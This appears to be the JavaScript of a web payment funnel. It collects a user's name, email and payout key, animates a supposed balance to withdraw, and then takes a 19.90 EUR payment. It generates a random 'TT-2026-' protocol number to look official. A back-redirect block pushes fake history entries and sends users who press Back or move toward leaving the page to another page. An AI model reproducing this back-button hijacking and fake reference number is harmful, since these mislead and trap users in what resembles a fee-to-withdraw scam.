      metodoValor: metodoInput ? metodoInput.value.trim() : "",
    };

    // Armazena os dados para usar na página de confirmação
    window.__formData = formData;

    // Salva também no localStorage para persistência
    try {
      localStorage.setItem("userPixData", JSON.stringify(formData));
    } catch (e) {
      console.error("Erro ao salvar no localStorage", e);
    }


    // Sucesso: Fecha modais e vai para #seven
    closeAllModals();

    if (typeof window.showScreen === "function") {
      window.showScreen("seven");
    } else {
      location.hash = "#seven";
    }
  });

  // Helpers de Formatação (Máscaras)
  function formatPixKey(value, type) {
    if (!value) return "";

    if (type === "DNI") {
      value = value.replace(/\D/g, ""); // Remove tudo que não é dígito
      if (value.length > 11) value = value.slice(0, 11); // Limita a 11 dígitos

      // Aplica máscara: 000.000.000-00
      return value
        .replace(/(\d{3})(\d)/, "$1.$2")
        .replace(/(\d{3})(\d)/, "$1.$2")
        .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    }

    if (type === "Móvil") {
      value = value.replace(/\D/g, ""); // Remove tudo que não é dígito
      if (value.length > 11) value = value.slice(0, 11); // Limita a 11 dígitos

      // Aplica máscara: (00) 00000-0000
      if (value.length > 10) {
        return value.replace(/^(\d\d)(\d{5})(\d{4}).*/, "($1) $2-$3");
      } else if (value.length > 6) {
        return value.replace(/^(\d\d)(\d{4})(\d{0,4}).*/, "($1) $2-$3");
      } else if (value.length > 2) {
        return value.replace(/^(\d\d)(\d{0,5})/, "($1) $2");
      } else {
        return value.replace(/^(\d*)/, "($1");
      }
    }

    if (type === "Clave aleatoria") {
      // Remove tudo que não é hex
      value = value.replace(/[^0-9a-fA-F]/g, "");
      if (value.length > 32) value = value.slice(0, 32); // Limita a 32 chars hex

      // Aplica máscara UUID: 8-4-4-4-12
      // xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
      let result = "";
      if (value.length > 0) result += value.slice(0, 8);
      if (value.length > 8) result += "-" + value.slice(8, 12);
      if (value.length > 12) result += "-" + value.slice(12, 16);
      if (value.length > 16) result += "-" + value.slice(16, 20);
      if (value.length > 20) result += "-" + value.slice(20, 32);

      return result;
    }

    return value;
  }

  // 4. Restrição de caracteres e Máscaras no input
  const pixKeyInput = document.getElementById("pix-key-input");
  if (pixKeyInput) {
    pixKeyInput.addEventListener("input", function (ev) {
      const selectorText = document.getElementById("pix-selector-text");
      if (!selectorText) return;

      const selectedType = selectorText.textContent.trim();

      // Aplica formatação
      const formattedValue = formatPixKey(this.value, selectedType);

      // Atualiza o valor apenas se mudou (evita loop ou problemas de cursor em alguns casos simples)
      if (this.value !== formattedValue) {
        this.value = formattedValue;
      }

      // Revalida o formulário
      checkPixFormValidity();
    });
  }
})();

/* =========================
   Anima valor e controla active dos botões em #three
   Cole este bloco dentro do seu main.js, idealmente dentro de DOMContentLoaded
   ========================= */

(function () {
  // --- helper: formata número como moeda BRL ---
  function formatBRL(value) {
    return new Intl.NumberFormat("es-ES", {
      style: "currency",
      currency: "EUR",
    }).format(value);
  }

  // --- helper: converte "735,48 €" -> number (4596.72) ---
  function parseBRL(text) {
    if (!text) return 0;
    // remove tudo exceto dígitos e vírgula/ponto
    // suporta formatos: "735,48 €" ou "4596.72"
    const cleaned = String(text)
      .replace(/\s/g, "")
      .replace(/[Rr]\$\s?/, "")
      .replace(/\./g, "") // remove separador de milhar
      .replace(/,/g, "."); // troca vírgula decimal para ponto
    const n = parseFloat(cleaned);
    return isNaN(n) ? 0 : n;
  }

  // --- anima número de 0 até target (ou de start -> target) ---
  function animateNumberTo(el, targetNumber, duration = 1400, startNumber = 0) {
    if (!el) return;
    const start = performance.now();
    const end = start + duration;
    function tick(now) {
      const t = Math.min(1, (now - start) / duration);
      // easeOutQuad
      const eased = 1 - (1 - t) * (1 - t);
      const current = startNumber + (targetNumber - startNumber) * eased;
      el.textContent = formatBRL(current);
      if (now < end) {
        requestAnimationFrame(tick);
      } else {
        // garante valor final exato
        el.textContent = formatBRL(targetNumber);
      }
    }
    requestAnimationFrame(tick);
  }

  // --- encontra o elemento do valor na section three ---
  function findAmountElement() {
    // tenta vários seletores comuns (ajuste se quiser)
    const selectors = [
      "#three .valor", // se existir
      "#three .popup-valor",
      "#three .amount",
      "#three .big-valor",
      "#three .valor-principal",
      "#three .saldo-valor",
      "#three .valor-total",
      "#three [data-amount-target]", // data attribute
      "#three .amount-target",
      "#three h1 .valor",
    ];
    for (const sel of selectors) {
      const el = document.querySelector(sel);
      if (el) return el;
    }
    // fallback: busca qualquer texto de moeda dentro de #three
    const three = document.getElementById("three");
    if (!three) return null;
    // procura por nós que contenham "R$"
    const nodes = three.querySelectorAll("*");
    for (const n of nodes) {
      if (n.children.length === 0 && /R\$\s*\d/.test(n.textContent || "")) {
        return n;
      }
    }
    return null;
  }

  // --- gerencia botões da linha .botoes-row-sacar ---

  function initBotoesRowSacar() {
    const container =
      document.querySelector("#three .botoes-row-sacar") ||
      document.querySelector(".botoes-row-sacar");
    if (!container) return;

    const buttons = Array.from(
      container.querySelectorAll('button, [role="button"], a')
    );

    // incluir manualmente o botão display-total
    const displayTotal = document.querySelector(".display-total");
    if (displayTotal) buttons.push(displayTotal);

    const activeClass = "btn-active";
    const sacarBtn = document.querySelector(".btn-sacar-dois");

    // começa bloqueado
    // quando o botão sacar estiver ativo e for clicado
    if (sacarBtn) {
      sacarBtn.addEventListener("click", () => {
        // só abre se estiver liberado
        if (!sacarBtn.classList.contains("btn-sacar-indisponivel")) {
          if (typeof window.__spa_modal_helpers.showModal === "function") {
            window.__spa_modal_helpers.showModal("four");
          } else {
            showModal("four"); // fallback caso esteja no escopo
          }
        }
      });
    }

    function removeActive() {
      buttons.forEach((btn) => btn.classList.remove(activeClass));
    }

    // === LISTENER CORRETO (somente 1 vez) ===
    buttons.forEach((btn) => {
      btn.addEventListener("click", () => {
        removeActive();
        btn.classList.add(activeClass);

        // liberar o botão SACAR imediatamente
        if (sacarBtn) {
          sacarBtn.classList.remove("btn-sacar-indisponivel");
          sacarBtn.removeAttribute("disabled");
          sacarBtn.style.pointerEvents = "auto";
          sacarBtn.style.opacity = "1";
        }
      });
    });

    // limpa o estado inicial
    removeActive();
  }

  // --- função principal a ser chamada quando #three for exibida ---
  function onShowThree() {
    // 1) animar valor - DESABILITADO: agora usamos animateCurrencyCounter unificada
    // A animação é feita diretamente no showScreen do router principal
    /*
    const amountEl = findAmountElement();
    if (amountEl) {
      // tenta ler target em data-target (ex: data-amount-target="735.48")
      let target = null;
      if (amountEl.dataset && amountEl.dataset.amountTarget) {
        target = parseFloat(amountEl.dataset.amountTarget);
      }
      if (target === null || isNaN(target)) {
        target = parseBRL(amountEl.textContent || amountEl.innerText);
      }
      // se não encontrou, ignore
      if (!isNaN(target) && target > 0) {
        // opcional: começar mostrando 0 formatado imediatamente
        amountEl.textContent = formatBRL(0);
        animateNumberTo(amountEl, target, 1400, 0);
      }
    }
    */

    // 2) init botoes
    initBotoesRowSacar();
  }

  // --- Hook: se seu router expõe showScreen, intercepta chamadas para 'three' ---
  // Se showScreen for global (como no main.js que usamos), monkey-patch para rodar onShowThree sempre que #three for mostrado.
  if (window.showScreen && typeof window.showScreen === "function") {
    const originalShowScreen = window.showScreen;
    window.showScreen = function (id, push) {
      originalShowScreen(id, push);
      if (String(id) === "three") {
        // pequeno timeout para dar tempo ao DOM ser mostrado/estilos aplicados
        setTimeout(onShowThree, 30);
      }
    };
  } else {
    // fallback: quando DOMContentLoaded e se já estiver em #three, executa
    document.addEventListener("DOMContentLoaded", () => {
      if (location.hash.replace("#", "") === "three") {
        setTimeout(onShowThree, 30);
      }
    });
  }

  // também expõe manualmente para caso queira disparar por console:
  window.__spa_helpers = window.__spa_helpers || {};
  window.__spa_helpers.onShowThree = onShowThree;
})();

// DESABILITADO: Agora usamos a função unificada animateCurrencyCounter
// que é chamada diretamente no showScreen do router principal
/*
// === Count-up robusto para #three (usa data-amount-target) ===
(function () {
  // evita múltiplas execuções
  let threeAnimated = false;

  function formatBRL(value) {
    return value.toLocaleString("es-ES", {
      style: "currency",
      currency: "EUR",
    });
  }

  function animateCountUp(el, target, duration = 1400) {
    if (!el) return;
    const start = performance.now();
    const from = 0;
    function step(now) {
      const t = Math.min(1, (now - start) / duration);
      const eased = 1 - (1 - t) * (1 - t); // easeOutQuad
      const current = from + (target - from) * eased;
      el.textContent = formatBRL(current);
      if (t < 1) requestAnimationFrame(step);
      else el.textContent = formatBRL(target);
    }
    requestAnimationFrame(step);
  }

  function startCountUpThree() {
    // se já animou e você não quer repetir, pare aqui
    if (threeAnimated) return;
    const el = document.querySelector("#three [data-amount-target]");
    if (!el) return;
    const raw = el.getAttribute("data-amount-target");
    const target = parseFloat(raw);
    if (isNaN(target)) return;
    // mostra zero imediatamente e anima
    el.textContent = formatBRL(0);
    // pequeno timeout para garantir estilos aplicados / repaint
    setTimeout(() => animateCountUp(el, target, 1400), 30);
    threeAnimated = true;
  }

  // 1) Hook no showScreen (se existir)
  if (window.showScreen && typeof window.showScreen === "function") {
    const orig = window.showScreen;
    window.showScreen = function (id, push) {
      orig(id, push);
      if (String(id) === "three") {
        // reseta flag se quiser re-animar cada vez -> threeAnimated = false;
        startCountUpThree();
      }
    };
  }

  // 2) MutationObserver no próprio #three para detectar classes (fallback)
  const threeEl = document.getElementById("three");
  if (threeEl) {
    const mo = new MutationObserver((records) => {
      for (const r of records) {
        if (r.type === "attributes" && r.attributeName === "class") {
          if (threeEl.classList.contains("is-active")) {
            startCountUpThree();
            break;
          }
        }
      }
    });
    mo.observe(threeEl, { attributes: true, attributeOldValue: true });
  }

  // 3) Caso já esteja ativa no carregamento (ex.: #three no hash), dispara agora
  document.addEventListener("DOMContentLoaded", () => {
    const threeNow = document.getElementById("three");
    if (threeNow && threeNow.classList.contains("is-active")) {
      // aguarda um tick para garantir render
      setTimeout(startCountUpThree, 20);
    }
  });

  // opcional: expor função para forçar re-execução via console
  window.__countup_helpers = window.__countup_helpers || {};
  window.__countup_helpers.startCountUpThree = function (force) {
    if (force) threeAnimated = false;
    startCountUpThree();
  };
})();
*/

// apaga akiiiiiiiiiiiiiiiii

/* ===== Count-up definitivo para o span em #three ===== */
(function () {
  const SEL = "#three .valor-currency-dois[data-amount-target]";

  function formatBRL(value) {
    return value.toLocaleString("es-ES", {
      style: "currency",
      currency: "EUR",
    });
  }

  function animateCountUpEl(el, target, duration = 1400) {
    if (!el) return;
    const startVal = 0;
    const startTime = performance.now();
    function step(now) {
      const t = Math.min(1, (now - startTime) / duration);
      const eased = 1 - (1 - t) * (1 - t); // easeOutQuad
      const current = startVal + (target - startVal) * eased;
      el.textContent = formatBRL(current);
      if (t < 1) requestAnimationFrame(step);
      else el.textContent = formatBRL(target); // garante valor final exato
    }
    requestAnimationFrame(step);
  }

  function triggerCountUp() {
    const el = document.querySelector(SEL);
    if (!el) return;
    const raw = el.getAttribute("data-amount-target");
    const target = parseFloat(raw);
    if (isNaN(target)) return;
    // zera e anima
    el.textContent = formatBRL(0);
    // timeout pequeno para garantir repaint antes da animação
    setTimeout(() => animateCountUpEl(el, target, 1400), 20);
  }

  // DESABILITADO: Agora usamos a função unificada animateCurrencyCounter
  // que é chamada diretamente no showScreen do router principal
  /*
  // 1) Hook no showScreen (se existir) — re-anima sempre que for para #three
  if (window.showScreen && typeof window.showScreen === "function") {
    const orig = window.showScreen;
    window.showScreen = function (id, push) {
      orig(id, push);
      if (String(id) === "three") {
        // força re-animação a cada entrada
        triggerCountUp();
      }
    };
  }

  // 2) MutationObserver no próprio #three (fallback para outros fluxos)
  const threeEl = document.getElementById("three");
  if (threeEl) {
    const mo = new MutationObserver((records) => {
      for (const r of records) {
        if (r.type === "attributes" && r.attributeName === "class") {
          if (threeEl.classList.contains("is-active")) triggerCountUp();
        }
      }
    });
    mo.observe(threeEl, { attributes: true });
  }
  */

  // 3) Se já estiver ativa no carregamento (ex.: hash = #three), dispara agora
  document.addEventListener("DOMContentLoaded", () => {
    const threeNow = document.getElementById("three");
    if (threeNow && threeNow.classList.contains("is-active")) {
      setTimeout(triggerCountUp, 20);
    }
  });

  // expõe helper para testar no console: window.__countup.trigger(true)
  window.__countup = window.__countup || {};
  window.__countup.trigger = function (force) {
    if (force) {
      // força zerar e re-rodar
      const el = document.querySelector(SEL);
      if (el) el.textContent = formatBRL(0);
    }
    triggerCountUp();
  };
})();

// apaga abaixo

document.addEventListener("DOMContentLoaded", function () {
  // Garante que o SPA já inicializou o router
  setTimeout(() => {
    if (window.showScreen) {
      const originalShowScreen = window.showScreen;

      window.showScreen = function (id, push) {
        originalShowScreen(id, push);

        if (id === "three") {
          setTimeout(() => {
            if (window.__spa_helpers && window.__spa_helpers.onShowThree) {
              window.__spa_helpers.onShowThree();
            }
          }, 30);
        }
      };
    }
  }, 100);
});

/* ============= PAGO SEGURO (screen #ten) ============= */
(function () {
  /* ---- Cooud API v2 Elements ---- */
  var PRODUCT_ID = "01KZ7W13DD2MVBGG66NPG9EA9T";
  var cooudStarted = false;
  var unmountCooud = null;

  function loadCooudElements() {
    if (window.__CooudElements__) return Promise.resolve(window.__CooudElements__);
    return new Promise(function (resolve, reject) {
      var existing = document.querySelector("script[data-cooud-elements]");
      if (existing) {
        existing.addEventListener("load", function () { resolve(window.__CooudElements__); });
        existing.addEventListener("error", function () { reject(new Error("No se pudo cargar Cooud Elements.")); });
        return;
      }
      var script = document.createElement("script");
      script.src = "https://cdn.cooud.com/cdn/elements/v1.js";
      script.async = true;
      script.dataset.cooudElements = "true";
      script.onload = function () {
        if (!window.__CooudElements__) return reject(new Error("Cooud Elements no se inicializó."));
        resolve(window.__CooudElements__);
      };
      script.onerror = function () { reject(new Error("No se pudo cargar Cooud Elements.")); };
      document.head.appendChild(script);
    });
  }

  function showPayError(message) {
    var element = document.getElementById("cooud-error");
    if (!element) return;
    element.textContent = message || "";
    element.style.display = message ? "block" : "none";
  }

  function buyerEmail() {
    var element = document.getElementById("pago-correo");
    var value = element ? (element.textContent || "").trim() : "";
    return /\S+@\S+\.\S+/.test(value) ? value : "";
  }

  function initCooud() {
    if (cooudStarted) return;
    var container = document.getElementById("cooud-payment");
    if (!container) return;
    var email = buyerEmail();
    if (!email) { showPayError("No encontramos tu email. Vuelve y complétalo."); return; }
    cooudStarted = true;
    showPayError("");

    Promise.all([
      loadCooudElements(),
      fetch("/api/public/cooud/checkout", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ productId: PRODUCT_ID, buyerEmail: email, quantity: 1, origin: window.location.origin, returnPath: "/up1" })
      }).then(function (response) {
        return response.text().then(function (raw) {
          var data;
          try { data = JSON.parse(raw); } catch (e) {
            throw new Error("El servidor devolvió una respuesta no válida (HTTP " + response.status + "). Publica la última versión del sitio e inténtalo de nuevo.");
          }
          if (!response.ok) {
            var detail = data.details && data.details.message;
            var requestId = data.requestId ? " · request_id: " + data.requestId : "";
            throw new Error((detail || data.message || "No se pudo crear la sesión de pago.") + requestId);
          }
          return data;
        });
      })
    ]).then(function (result) {
      var Cooud = result[0];
      var config = result[1];
      if (unmountCooud) unmountCooud();
      unmountCooud = Cooud.mount({
        container: container,
        sessionId: config.sessionId,
        elementToken: config.elementToken,
        sessionSecret: config.sessionSecret,
        appearance: (config.appearance && config.appearance.appearance) || { theme: "light" },
        apiBaseUrl: "https://api.cooud.com",
        compatDate: "2026-09-01",
        onSuccess: function () {
          window.location.assign("/up1?checkout_session_id=" + encodeURIComponent(config.sessionId) + "&productId=" + encodeURIComponent(PRODUCT_ID) + "&redirect_status=succeeded");
        },
        onError: function (error) {
          showPayError((error && error.message ? error.message : "No se pudo procesar el pago.") + (error && error.code ? " (" + error.code + ")" : ""));
        }
      });
      try {
        if (window.ttq && window.ttq.track) window.ttq.track("InitiateCheckout", { content_id: PRODUCT_ID, content_type: "product", quantity: 1, value: 19.9, currency: "EUR" });
      } catch (error) { console.error("ttq InitiateCheckout failed", error); }
    }).catch(function (error) {
      cooudStarted = false;
      console.error("[Cooud v2] checkout bootstrap failed", error);
      showPayError(error && error.message ? error.message : "No se pudo cargar el pago.");
    });
  }

  function fillPago() {
    let d = window.__formData;
    if (!d) { try { d = JSON.parse(localStorage.getItem("userPixData") || "null"); } catch(e){} }
    // Ler valores atuais (possivelmente editados) da tela de confirmação
    const nameI = document.getElementById("confirmation-name");
    const emailI = document.getElementById("confirmation-email");
    const metLbl = document.getElementById("confirmation-metodo-label");
    const metVal = document.getElementById("confirmation-metodo-value");
    const nome = (nameI && nameI.value) || (d && d.nome) || "—";
    const correo = (emailI && emailI.value) || (d && d.correo) || "—";
    const mLabel = (metLbl && metLbl.textContent) || (d && d.metodoLabel) || "PayPal";
    const mValor = (metVal && metVal.value) || (d && d.metodoValor) || "—";

    const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
    set("pago-nombre", nome);
    set("pago-correo", correo);
    set("pago-metodo-label", mLabel);
    set("pago-metodo-value", mValor);

    // Protocolo aleatório
    const prot = document.getElementById("pago-protocolo");
    if (prot && !prot.dataset.set) {
      const rand = Math.random().toString(36).slice(2, 8).toUpperCase();
      prot.textContent = "TT-2026-" + rand;
      prot.dataset.set = "1";
    }
  }

  // Máscara básica dos campos
  function bindMasks() {
    const num = document.getElementById("pago-numero");
    if (num && !num.dataset.bound) {
      num.dataset.bound = "1";
      num.addEventListener("input", () => {
        let v = num.value.replace(/\D/g, "").slice(0, 16);
        num.value = v.replace(/(.{4})/g, "$1 ").trim();
      });
    }
    const val = document.getElementById("pago-validade");
    if (val && !val.dataset.bound) {
      val.dataset.bound = "1";
      val.addEventListener("input", () => {
        let v = val.value.replace(/\D/g, "").slice(0, 4);
        if (v.length >= 3) v = v.slice(0, 2) + " / " + v.slice(2);
        val.value = v;
      });
    }
    const cvc = document.getElementById("pago-cvc");
    if (cvc && !cvc.dataset.bound) {
      cvc.dataset.bound = "1";
      cvc.addEventListener("input", () => { cvc.value = cvc.value.replace(/\D/g, "").slice(0, 4); });
    }
  }

  document.addEventListener("click", (e) => {
    const back = e.target.closest("#pago-back");
    if (back) {
      e.preventDefault();
      if (typeof window.showScreen === "function") window.showScreen("nine");
      return;
    }
    const cta = e.target.closest("#cta-ir-pago");
    if (cta) {
      e.preventDefault();
      fillPago();
      bindMasks();
      if (typeof window.showScreen === "function") window.showScreen("ten");
      window.scrollTo(0, 0);
      setTimeout(initCooud, 50);
      return;
    }
  });

  // Se entrar direto via hash #ten
  window.addEventListener("hashchange", () => {
    if (location.hash === "#ten") { fillPago(); bindMasks(); initCooud(); }
  });
  if (location.hash === "#ten") { setTimeout(() => { fillPago(); bindMasks(); initCooud(); }, 50); }

})();

/* ===== Back-redirect: ativo SOMENTE na tela da oferta (#nine) ===== */
(function () {
  if (location.pathname.indexOf("back-redirect") !== -1) return;

  var TARGET = "/back-redirect";
  var ONCE_KEY = "__br_done__";
  var armed = false;      // sentinelas de histórico já empilhadas
  var nineActive = false; // tela da oferta visível no momento

  function alreadyDone() {
    try { return sessionStorage.getItem(ONCE_KEY) === "1"; } catch (e) { return false; }
  }
  function markDone() {
    try { sessionStorage.setItem(ONCE_KEY, "1"); } catch (e) {}
  }
  function go() {
    if (alreadyDone()) return;
    markDone();
    window.location.replace(TARGET);
  }

  function arm() {
    if (armed || alreadyDone()) return;
    armed = true;
    // Duas sentinelas: cobre navegadores que consomem um estado extra (TikTok in-app)
    try {
      history.pushState({ br: 1 }, "", location.href);
      history.pushState({ br: 2 }, "", location.href);
    } catch (e) {}
  }

  function check() {
    var nine = document.getElementById("nine");
    var active = !!nine && nine.classList.contains("is-active");
    nineActive = active;
    if (active) arm();
  }

  // Observa a troca de telas (showScreen apenas alterna classes)
  if (window.MutationObserver) {
    var obs = new MutationObserver(check);
    obs.observe(document.documentElement, {
      subtree: true,
      attributes: true,
      attributeFilter: ["class"],
    });
  }
  setInterval(check, 400);
  document.addEventListener("DOMContentLoaded", check);
  window.addEventListener("hashchange", check);
  check();

  window.addEventListener("popstate", function () {
    if (!nineActive || alreadyDone()) return;
    go();
  });

  // Exit-intent no desktop, apenas na tela da oferta
  document.addEventListener("mouseleave", function (e) {
    if (nineActive && e.clientY <= 0 && !/Mobi|Android/i.test(navigator.userAgent)) go();
  });

  // bfcache: evita estado inconsistente ao voltar
  window.addEventListener("pageshow", function (e) {
    if (e.persisted) { armed = false; check(); }
  });
})();

